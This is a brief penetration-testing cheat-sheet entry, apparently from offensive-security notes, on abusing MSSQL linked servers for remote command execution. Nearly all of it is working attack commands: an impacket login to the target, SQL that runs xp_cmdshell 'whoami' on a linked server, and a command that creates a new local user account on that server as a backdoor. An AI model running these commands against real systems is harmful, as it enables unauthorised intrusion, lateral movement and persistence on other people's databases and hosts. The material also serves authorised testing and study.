# MSSQL Linked Server xp_cmdshell RCE

With any SQL login, check for linked servers — a common lateral-movement path even when `xp_cmdshell` is disabled locally.

```bash
mssqlclient.py '<domain>/<user>:<pass>'@<target> -windows-auth
```
```sql
EXEC sp_linkedservers;
EXEC ('xp_cmdshell ''whoami''') AT <LINKED_SERVER_NAME>;
EXEC ('xp_cmdshell ''net user <u> <p> /add''') AT <LINKED_SERVER_NAME>;
```
